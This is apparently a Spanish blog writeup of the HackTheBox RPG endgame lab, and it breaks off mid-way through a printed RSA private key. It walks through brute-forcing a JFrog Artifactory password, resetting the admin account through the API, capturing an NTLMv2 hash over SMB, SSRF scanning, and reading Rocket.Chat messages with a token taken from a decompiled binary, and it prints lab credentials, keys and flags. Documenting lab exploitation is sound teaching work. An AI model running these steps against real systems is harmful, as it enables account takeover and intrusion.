@@ -1,0 +1,2128 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox RPG</title>
+
+  <meta name="description" content="Resolución del endgame RPG de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox RPG">
+  <meta name="twitter:description" content="Resolución del endgame RPG de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/rpg.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox RPG">
+  <meta property="og:description" content="Resolución del endgame RPG de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/rpg.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/rpg.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox RPG" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/endgames" title="GatoGamer1155" class="blog-button">EndGames</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#flag1">Would you like to play a game?</a></li>
+        <li><a href="#flag2">Sword and mind</a></li>
+        <li><a href="#flag3">One's act, one's profit</a></li>
+        <li><a href="#flag4">The source of power</a></li>
+        <li><a href="#flag5">Wake from death and turn to life</a></li>
+        <li><a href="#flag6">Collapse of the empire</a></li>
+        <li><a href="#extra1">Extra 1</a></li>
+        <li><a href="#extra2">Extra 2</a></li>
+        <li><a href="#extra3">Extra 3</a></li>
+        <li><a href="#extra4">Extra 4</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/rpg.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">RPG</h2><br>
+  </header>
+  
+<section class="post" id="flag1">
+<br><h3 class="post-title">Would you like to play a game?</h3>
+<h4 class="post-title">RPG{c0waBuNg@!_Ssrf1n_iNtO_tHe_1nt3rn@l!}</h4><br>
+
+<p class="plain-text">Iniciamos escaneando los puertos con <code class="language-plaintext highlighter-rouge">nmap</code>, en este caso especifico tenemos 2 hosts que son la <code class="language-plaintext highlighter-rouge">.18</code> y <code class="language-plaintext highlighter-rouge">.19</code> y estos seran nuestro punto de entrada para el laboratorio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.13.38.18-19
+Nmap scan report for 10.13.38.18  
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+
+Nmap scan report for 10.13.38.19  
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+445/tcp  open  microsoft-ds
+8081/tcp open  blackice-icecap</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El host <code class="language-plaintext highlighter-rouge">.19</code> tiene el smb abierto, el nombre de la maquina es <code class="language-plaintext highlighter-rouge">gelus</code> y pertenece al dominio <code class="language-plaintext highlighter-rouge">roundsoft.local</code>, pero sin credenciales validas no nos sirve de nada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.13.38.19                                            
+</span><span class="az">SMB         </span><span class="p">10.13.38.19     445    GELUS            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">80</code> que es una web en la <code class="language-plaintext highlighter-rouge">.18</code> solo nos muestra una imagen y el puerto <code class="language-plaintext highlighter-rouge">3000</code> un login de <code class="language-plaintext highlighter-rouge">rocket chat</code> al que sin credenciales no podemos obtener acceso</p>
+<a href="/endgames/rpg/2.png" target="_blank"><div><p><img src="/endgames/rpg/2.png"></p></div></a>
+
+<a href="/endgames/rpg/3.png" target="_blank"><div><p><img src="/endgames/rpg/3.png"></p></div></a>
+
+<p class="plain-text">En el puerto <code class="language-plaintext highlighter-rouge">80</code> de la maquina <code class="language-plaintext highlighter-rouge">.19</code> encontramos la clasica pagina por defecto de <code class="language-plaintext highlighter-rouge">IIS</code>, y en el puerto <code class="language-plaintext highlighter-rouge">8081</code> se nos redirige a un panel de login de <code class="language-plaintext highlighter-rouge">jfrog factory</code></p>
+<a href="/endgames/rpg/1.png" target="_blank"><div><p><img src="/endgames/rpg/1.png"></p></div></a>
+
+<a href="/endgames/rpg/4.png" target="_blank"><div><p><img src="/endgames/rpg/4.png"></p></div></a>
+
+<p class="plain-text">Si acudimos a la <a href="https://jfrog.com/help/r/how-to-change-the-default-password-for-access-admin-user/what-is-the-access-admin-user-used-for">documentación</a> se nos habla de un usuario <code class="language-plaintext highlighter-rouge">access-admin</code> que usa autenticacion basica, podemos intentar bruteforcear la contraseña de este usuario usando la <code class="language-plaintext highlighter-rouge">api</code>, la contraseña Password12 nos devuelve un <code class="language-plaintext highlighter-rouge">404</code> en lugar del <code class="language-plaintext highlighter-rouge">401</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Passwords/Leaked-Databases/honeynet.txt -u http://10.13.38.19:8081/access/api/v1 --basic access-admin:FUZZ -H </span><span class="am">"Content-Type: application/json" </span><span class="p">--hc 401  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.13.38.19:8081/access/api/v1
+Total requests: 226081
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000966:   </span><span class="ro">404</span><span class="p">        5 L      17 W       94 Ch       "Password12"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque tenemos la <code class="language-plaintext highlighter-rouge">contraseña</code> si intentamos usarla en el login nos dice que el acceso a la <code class="language-plaintext highlighter-rouge">interfaz</code> se ha deshabilitado especificamente para este usuario</p>
+<a href="/endgames/rpg/5.png" target="_blank"><div><p><img src="/endgames/rpg/5.png"></p></div></a>
+
+<p class="plain-text">Volviendo a la <a href="https://jfrog.com/help/r/how-to-change-the-default-password-for-access-admin-user/how-to-change-the-password-for-access-admin">documentación</a> se nos muestra como cambiar la <code class="language-plaintext highlighter-rouge">contraseña</code> de un usuario, asi que podemos cambiarle la contraseña directamente al usuario <code class="language-plaintext highlighter-rouge">admin</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s -X PATCH http://10.13.38.19:8081/artifactory/api/access/api/v1/users/admin -u access-admin:Password12 -d </span><span class="am">'{"password":"password123#"}'</span><span class="p"> -H </span><span class="am">'Content-Type: application/json'</span><span class="p"> | </span><span class="ve">jq</span><span class="p">
+{
+  </span><span class="az">"username"</span><span class="p">: </span><span class="ve">"admin"</span><span class="p">,
+  </span><span class="az">"email"</span><span class="p">: </span><span class="ve">"jfrog-admin@roundsoft.local"</span><span class="p">,
+  </span><span class="az">"realm"</span><span class="p">: </span><span class="ve">"internal"</span><span class="p">,
+  </span><span class="az">"status"</span><span class="p">: </span><span class="ve">"enabled"</span><span class="p">,
+  </span><span class="az">"allowed_ips"</span><span class="p">: [
+    </span><span class="ve">"*"</span><span class="p">
+  ],
+  </span><span class="az">"created"</span><span class="p">: </span><span class="ve">"2019-11-16T17:25:13.904-08:00"</span><span class="p">,
+  </span><span class="az">"modified"</span><span class="p">: </span><span class="ve">"2023-08-25T09:43:30.487-07:00"</span><span class="p">,
+  </span><span class="az">"last_login_time"</span><span class="p">: </span><span class="ve">"2020-06-14T23:53:36.039-07:00"</span><span class="p">,
+  </span><span class="az">"last_login_ip"</span><span class="p">: </span><span class="ve">"10.10.14.10"</span><span class="p">,
+  </span><span class="az">"custom_data"</span><span class="p">: {
+    </span><span class="az">"public_key"</span><span class="p">: </span><span class="ve">"JUHfDLxBPMe4YZbWLKdbams2ZTPq3rmG1zxgTFhrFQEh8fUTDWfNMxDka1ipqdZwGLZY6dhmWpZrYfefNiSQRMYGCidZs6YJEEwAgAJ4nEbyYE9KybxXWsSuHJ2VB1xpwsf1P"</span><span class="p">,
+    </span><span class="az">"apiKey_shash"</span><span class="p">: </span><span class="ve">"CVH6pG"</span><span class="p">,
+    </span><span class="az">"apiKey"</span><span class="p">: </span><span class="ve">"AKCp5e31BNLmPhjFrkk6oPKecoKcypYtxSY9QrMvDSHMWVgghVLFqfdpENgSfzQRqZsJmg1Pm"</span><span class="p">,
+    </span><span class="az">"updatable_profile"</span><span class="p">: </span><span class="ve">"true"</span><span class="p">,
+    </span><span class="az">"private_key"</span><span class="p">: </span><span class="ve">"JR5cohej8r9cKXYVgnxhLowKuQWaX4AjMQYxt2Up6AADGw6eaUkqfh3wRnPHTuC1cEeF24i1uwKQa4a8QH4G7QVLyGw2Ao5CAMSo451bu99myYXzbXhguUN9JnDwKVymHDws3JXHZ4iprQKzfdt79KJmNXCvJ6syqvBzoXNKxqCm8pYXhLBHDSGHu2AXbjmzGa8idkteMPXqvq9XqRNuiP8aUCPUQFUsSjic4LxRoQQtDBNjmjFGcbGLK7Gx9XotVBRyvB3pjcFxNJHA7KmTzy19qx1wa5YfEM2TmN48h8qxnpyqS9tZpQ84vr4VWXKnhok8XFPEaB5PbxHxhUTXcXnfumPYm1MDQtyp6zXQzxUB3PfGXMfF9LHvGwzwXH1mLZv3d2R2B5NwUU8RpQ3A2fXV6fvstkeyfqzprZmeqC2o9zHSc75KYQEhHqcoK8b9Yn1dcKbAdmevkAGQpjpfd8a8"</span><span class="p">,  
+    </span><span class="az">"artifactory_admin"</span><span class="p">: </span><span class="ve">"true"</span><span class="p">
+  },
+  </span><span class="az">"password_expired"</span><span class="p">: false,
+  </span><span class="az">"password_last_modified"</span><span class="p">: 1692981810487,
+  </span><span class="az">"groups"</span><span class="p">: []
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al acceder como el usuario <code class="language-plaintext highlighter-rouge">admin</code> con la contraseña que definimos ganamos acceso a la interfaz de <code class="language-plaintext highlighter-rouge">Artifactory</code>, en el inicio se nos muestra que es la version <code class="language-plaintext highlighter-rouge">6.13.1</code></p>
+<a href="/endgames/rpg/6.png" target="_blank"><div><p><img src="/endgames/rpg/6.png"></p></div></a>
+
+<p class="plain-text">Podemos encontrar una funcion <code class="language-plaintext highlighter-rouge">Import Repository from Path</code> en el apartado de repositorios y como es un windows podemos intentar que cargue el directorio de un recurso <code class="language-plaintext highlighter-rouge">smb</code> y asi al conectarse e intentar autenticarse obtendremos un <code class="language-plaintext highlighter-rouge">hash</code></p>
+<a href="/endgames/rpg/7.png" target="_blank"><div><p><img src="/endgames/rpg/7.png"></p></div></a>
+
+<p class="plain-text">Y aunque obtenemos un hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> la contraseña parece bastante fuerte por lo que no logramos crackearla a traves de fuerza bruta y obtenerla en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.13.38.19,51463)
+[*] AUTHENTICATE_MESSAGE (ROUNDSOFT\repository_admin,GELUS)
+[*] User GELUS\repository_admin authenticated successfully
+[*] repository_admin::ROUNDSOFT:aaaaaaaaaaaaaaaa:b7934db0c9890fdd5989d7f676864a35:010100000000000080ef733174d7d901cbbe46d0826260fe000000000100100041005000520046007700770058004e000300100041005000520046007700770058004e0002001000520043004c0050006900480044004f0004001000520043004c0050006900480044004f000700080080ef733174d7d90106000400020000000800300030000000000000000000000000200000126f6f06f8b269e05bc2e249448f3eaf73a53aa8ae17aa8e117857449cdeea160a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000  
+[*] Closing down connection (10.13.38.19,51463)
+[*] Remaining connections []</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Revisando los <code class="language-plaintext highlighter-rouge">logs</code> de las peticiones en el inicio encontramos peticiones desde la direccion <code class="language-plaintext highlighter-rouge">192.168.125.135</code>, por lo que probablemente exista esa <code class="language-plaintext highlighter-rouge">interfaz</code> de red</p>
+<a href="/endgames/rpg/9.png" target="_blank"><div><p><img src="/endgames/rpg/9.png"></p></div></a>
+
+<p class="plain-text">Podriamos hacer lo de antes pero en lugar de apuntar a un recurso <code class="language-plaintext highlighter-rouge">smb</code> interno mediante un <code class="language-plaintext highlighter-rouge">SSRF</code> podriamos apuntar a uno interno para escanear el segmento</p>
+<a href="/endgames/rpg/10.png" target="_blank"><div><p><img src="/endgames/rpg/10.png"></p></div></a>
+
+<p class="plain-text">En el intruder podemos ver que los hosts <code class="language-plaintext highlighter-rouge">.88</code>, <code class="language-plaintext highlighter-rouge">.128</code> y <code class="language-plaintext highlighter-rouge">.129</code> tienen un tiempo de respuesta considerablemente <code class="language-plaintext highlighter-rouge">menor</code> al resto de peticiones hechas hasta la <code class="language-plaintext highlighter-rouge">.256</code></p>
+<a href="/endgames/rpg/11.png" target="_blank"><div><p><img src="/endgames/rpg/11.png"></p></div></a>
+
+<p class="plain-text">Tenemos 3 <code class="language-plaintext highlighter-rouge">hosts</code> activos que seran nuestro primer payload y el segundo sera una lista de <code class="language-plaintext highlighter-rouge">palabras</code> que usaremos para bruteforcear posibles recursos <code class="language-plaintext highlighter-rouge">smb</code> existentes</p>
+<a href="/endgames/rpg/15.png" target="_blank"><div><p><img src="/endgames/rpg/15.png"></p></div></a>
+
+<p class="plain-text">La longitud de la peticion <code class="language-plaintext highlighter-rouge">development</code> hecha a la <code class="language-plaintext highlighter-rouge">.129</code> es ligeramente menor al resto de peticiones por lo que podemos pensar que es un <code class="language-plaintext highlighter-rouge">recurso</code> existente</p>
+<a href="/endgames/rpg/16.png" target="_blank"><div><p><img src="/endgames/rpg/16.png"></p></div></a>
+
+<p class="plain-text">Volvemos al apartado de <code class="language-plaintext highlighter-rouge">Import Repository</code> esta vez usando un recurso smb interno que sera <code class="language-plaintext highlighter-rouge">\\192.168.125.129\Development</code> para asi poder ver los archivos en el</p>
+<a href="/endgames/rpg/17.png" target="_blank"><div><p><img src="/endgames/rpg/17.png"></p></div></a>
+
+<p class="plain-text">Si ahora revisamos el repositorio se ha agregado una carpeta llamada <code class="language-plaintext highlighter-rouge">feedback</code> la cual contiene diferentes archivos entre ellos la <code class="language-plaintext highlighter-rouge">flag.txt</code> que podemos descargar</p>
+<a href="/endgames/rpg/18.png" target="_blank"><div><p><img src="/endgames/rpg/18.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">flag.txt
+RPG{c0waBuNg@!_Ssrf1n_iNtO_tHe_1nt3rn@l!}  </span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag2">
+<br><h3 class="post-title">Sword and mind</h3>
+<h4 class="post-title">RPG{h1j@ckin_lyk_@_pir@t3}</h4><br>
+
+<p class="plain-text">Ademas nos encontramos con un archivo llamado <code class="language-plaintext highlighter-rouge">key.txt</code> y un <code class="language-plaintext highlighter-rouge">Feedbacks.exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">key.txt
+111091166030218062251222010115128136114113076235134212137064020174229081049098149097150097197008100104224193046241175229075026048009246089192212  
+
+</span><span class="ve">❯ file </span><span class="p">Feedbacks.exe 
+Feedbacks.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo en una maquina windows nos pide una <code class="language-plaintext highlighter-rouge">key</code> que probablemente es el txt</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\Feedbacks.exe  </span><span class="p">
+Key required.
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para entender mejor lo que hace por detras usando <a href="https://github.com/dnSpy/dnSpy">dnspy</a> podemos decompilarlo, en el encontramos una funcion <code class="language-plaintext highlighter-rouge">GetFeedback</code> que recibe un argumento <code class="language-plaintext highlighter-rouge">key</code> que usa como cabecera para autenticarse contra la api de <code class="language-plaintext highlighter-rouge">192.168.125.135:3000</code></p>
+<a href="/endgames/rpg/28.png" target="_blank"><div><p><img src="/endgames/rpg/28.png"></p></div></a>
+
+<p class="plain-text">Aplicamos un <code class="language-plaintext highlighter-rouge">breakpoint</code> justo donde define la cabecera <code class="language-plaintext highlighter-rouge">X-Auth-Token</code> y corremos el programa pasandole como <code class="language-plaintext highlighter-rouge">argumento</code> la key que es el contenido de <code class="language-plaintext highlighter-rouge">key.txt</code></p>
+<a href="/endgames/rpg/29.png" target="_blank"><div><p><img src="/endgames/rpg/29.png"></p></div></a>
+
+<p class="plain-text">Cuando se detiene en el <code class="language-plaintext highlighter-rouge">breakpoint</code> podemos ver el valor de la variable <code class="language-plaintext highlighter-rouge">key</code> que usa como contenido para la cabecera, esta cookie nos permitira autenticarnos</p>
+<a href="/endgames/rpg/30.png" target="_blank"><div><p><img src="/endgames/rpg/30.png"></p></div></a>
+
+<p class="plain-text">Ya que hace las peticiones hacia el puerto <code class="language-plaintext highlighter-rouge">3000</code> podemos suponer que es la <code class="language-plaintext highlighter-rouge">10.13.38.18</code> desde otra interfaz, autenticandonos con el <code class="language-plaintext highlighter-rouge">token</code> obtenemos los identificadores de los <code class="language-plaintext highlighter-rouge">chats</code> existentes para posteriormente poder leerlos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s -H </span><span class="am">"X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL"</span><span class="p"> -H </span><span class="am">"X-User-Id: HTpmn63zyESXXsGZa"</span><span class="p"> -H </span><span class="am">"Content-Type: application/json" "http://10.13.38.18:3000/api/v1/rooms.get"</span><span class="p"> | </span><span class="ve">jq</span><span class="p"> -r</span><span class="am"> '.update[] ._id'  </span><span class="p">
+2iHYAhwtJjbyj4a6N
+DdjTRzK3eskaJ8zkL
+GENERAL
+HTpmn63zyESXXsGZackBN4uDvbKecTqoBS
+HTpmn63zyESXXsGZakRyS6KgwZP4hHiLGz
+Saw9bYrjnusg9bheG
+X5xn88ZMRjpog4A9h
+eoxPkMvnBNCB8q9n8
+p3hQTN7DCc885v7cL
+qfmwycKpPkHNkLsyg</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En uno de los chats se menciona al usuario <code class="language-plaintext highlighter-rouge">beta_user</code> y que este tiene una clave</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s -H </span><span class="am">"X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL"</span><span class="p"> -H </span><span class="am">"X-User-Id: HTpmn63zyESXXsGZa"</span><span class="p"> -H </span><span class="am">"Content-Type: application/json" 'http://10.13.38.18:3000/api/v1/im.messages?roomId=HTpmn63zyESXXsGZackBN4uDvbKecTqoBS' </span><span class="p">| </span><span class="ve">jq</span><span class="p"> -r</span><span class="am"> '.messages[] .msg'  </span><span class="p">
+No problem
+thank you!
+Let me know if you have any issues getting in
+Ah yes. It should be 'beta_user'
+any idea?
+but looks like the username was changed
+I have the key
+so I wanted access to the Nix box
+me too
+Oh you know, the usual. You?
+how are you doing ?
+Greetings
+hello sir</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En otro chat podemos ver un mensaje donde menciona una <code class="language-plaintext highlighter-rouge">clave</code> adjunta que se dice sera necesaria para acceder a la red y debe guardarse en un lugar seguro</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-s -H </span><span class="am">"X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL"</span><span class="p"> -H </span><span class="am">"X-User-Id: HTpmn63zyESXXsGZa"</span><span class="am"> -H "Content-Type: application/json" </span><span class="am">'http://10.13.38.18:3000/api/v1/groups.messages?roomId=X5xn88ZMRjpog4A9h'</span><span class="p"> | </span><span class="ve">jq</span><span class="p"> -r </span><span class="am">'.messages[] .msg'  </span><span class="p">
+There goes another weekend....
+looks like we have a lot of work to do
+@here Please keep checking #development_requests
+
+OUT!!!
+:anguished:
+a...
+v...
+a...
+J..
+
+the next person who talks Java is OUT
+look at all the shitty code >_<
+
+
+please, for god's sake
+https://github.com/pH-7/Simple-Java-Calculator
+look a calc in Java
+༼ つ ◕_◕ ༽つ 
+looking it'll be poppin' calc :joy:
+MS open sourced calc
+https://github.com/microsoft/calculator
+funny, look at this
+[ ](http://192.168.125.135:3000/group/developers_chat?msg=uJzWdzdN6qRhBi2vL) 
+Announcement: The following attached key is necessary for accessing the development network. You each should have the appropriate login name. *Please keep this key safe! *
+lulz
+you're a skid
+I knew it
+I must've done something like that...
+:cold_sweat:
+It sucks when people DoS the boxes
+...........................................................................................................................................................................</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Revisando el campo <code class="language-plaintext highlighter-rouge">title_link</code> de los <code class="language-plaintext highlighter-rouge">attachments</code> encontramos algunas rutas, de ellas hay una que llama la atencion que es es archivo llamado <code class="language-plaintext highlighter-rouge">key.txt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-s -H </span><span class="am">"X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL"</span><span class="p"> -H </span><span class="am">"X-User-Id: HTpmn63zyESXXsGZa" </span><span class="p">-H </span><span class="am">"Content-Type: application/json" 'http://10.13.38.18:3000/api/v1/groups.messages?roomId=X5xn88ZMRjpog4A9h' </span><span class="p">| </span><span class="ve">jq</span><span class="p"> -r </span><span class="am">'.messages[] | select(.attachments) | .attachments[] .title_link'  </span><span class="p">
+/file-upload/qAiRe6ijGYYhqmNuK/angry-dwight.gif
+/file-upload/DuHLkxGXNFcvWZSDe/Clipboard%20-%20November%2017,%202019%2011:11%20AM
+/file-upload/HsfMgTAbbFqDykhJM/SimpleJavaCalculator.java
+/file-upload/RNquHSJfdjFiQJbCp/Calculator.java
+/file-upload/crBDvzQkhN77KLrxz/key.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos leer el contenido y se trata de una clave <code class="language-plaintext highlighter-rouge">RSA</code> probablemente para <code class="language-plaintext highlighter-rouge">ssh</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s -H </span><span class="am">"X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL"</span><span class="p"> -H </span><span class="am">"X-User-Id: HTpmn63zyESXXsGZa" </span><span class="p">-H </span><span class="am">"Content-Type: application/json" </span><span class="p">http://10.13.38.18:3000/file-upload/crBDvzQkhN77KLrxz/key.txt  
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAvucLZy/B0XvfbJWL0PKMyJU7sMsV84GJfUnxQd2dRYo5L6Ka
+lZd3l+6++GkiTdLEIHQgSkeqIxQ53B7Ju8WdNfrOBmnkpMDVaFVt0S5nR1DJ/K5E
+Jh836bGuXK3gqvAOaIayAj64CbiWPbwHUJ2ZWXWJNH8sUY7F1lqMYoXDfCtmLYd2
+8zZyqSEXBs8ONDwsVTnzDyMfIHU96d3LzyA0D/Gqn2NTb142yGHhnRbXFnfxkMcf
++VKKXYF71N3Wo1bIVGMk7L3OHdRXbjgX/VQ7GkN0ZNHgAI2vNinzQRFnZxIpaIgV
+wAQ8ygt9PocHaiYK7rNmpZU7hzOSeAC3t+HEQwIDAQABAoIBAQCx/hhauGN9X4L8
+6h53zn7HUqVZ/LDV3vSDldrVL71AplUVfgWl7pj6VwdF9Dig2SA2pi+pMlKG7Ifa
+Hfa4FdO0Dcnknv0pRAZ2hhijTiHLk58Q8qbl6HuocBuDnDd7CeJVQSleAH51yd6D
+ZvpnBtqBV557DQwUaws5BioYfmG7NdlgZR4ZWH6eb6zhAByq9mX1wcT5IeNH4mXZ
+inLPev2op98kswLLs56RHoSH7TIDX8QDoXho+4RQ78jvzYYhlGVDyAtEcEo6h7+M
+rdfVAV+061pBBandzCtedAO75Ahsa5qBhpb9yvAIvcg0hjNXeVlZuX/x9CF8qZCJ
+us1FfcYxAoGBAPTypqYHekZXnY6YzWQ2dSVbUzFYEmlqeEwvDGGbhwPsRlWvY3SG
+u17lT+OHWpYS4EF6CPkStR3SJrnSbjfm/gKurayLyKwB3s/VS0Ah1wh54pDsbXu9
+zcu1TiADxWEjBeBHsSoFIzPmEtwf0hu/Qe47QXdsBiU+sx7G6KcAjhb5AoGBAMeE
+ICFNkwpop8mh5da0pSSP1R/Ke/a2S5UcziMeUhmQRHv+cKmvuEnNBUIEFPilcDvN
+mr8Ja/P4+P3yRV1szoTVuCfO6cBxsX3gO7Ea5GlnMQBxgDGWMR8/UhGwTMxYDHDj
+76yp6FrCUmPNDj/3TglGHcGLcl/eXmLcfM5mLhgbAoGBAJ9fdiCWwu8buK78Kr8m
+U6g/uGxlom0mUik3f3XOrNVXmRfNKwe5VhZTW1xuR/lXRMQ1c7sjeeZyQrIrAX2r
+9N+n6eZXePS5rtBJNlH+8ptYOpsSydV2VH1TdQaNjZI7KGqaGuJ9Pz9YVjMVHS7i
+jTJFKb5a8dCv7/l5cAyg5tJ5AoGAcnd7d5/qHK6ulSAtnWFG3hMnU3X4aTNtab99
+BOkAcWoz4G+6c6A9OxpFSfrNjVpdafIsNi5RoUfWktvMsC0cz1lOrogn1CFmk7Fy
+jcnAAjkSBA8aXViuFh9eFofvh818VchwWb+hb3DNlDSxWEGqo+d2avR2SkpqHI4j
